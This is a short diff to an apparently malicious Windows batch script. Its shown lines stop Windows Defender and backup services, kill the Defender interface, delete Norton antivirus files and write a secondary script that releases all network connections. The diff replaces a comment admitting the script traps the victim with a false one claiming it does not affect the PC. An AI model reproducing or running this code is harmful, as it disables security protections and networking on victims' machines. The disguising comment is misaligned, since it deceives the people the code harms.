@@ -5,7 +5,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 
 
-:: Disables antivirus, firewall, taskmanager, to make sure your not going to get out of this...
+:: Disables antivirus, firewall, taskmanager, and a couple of other proseces (does not affect your PC and is only to make the drive not look sus)
 net stop "SDRSVC"
 net stop "WinDefend"
 taskkill /f /t /im "MSASCui.exe"
@@ -34,6 +34,7 @@ del /Q /F C:\Program Files\Norton~1\*.*
 ::color red, can be changed.
 COLOR 0F
 
+:: other
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
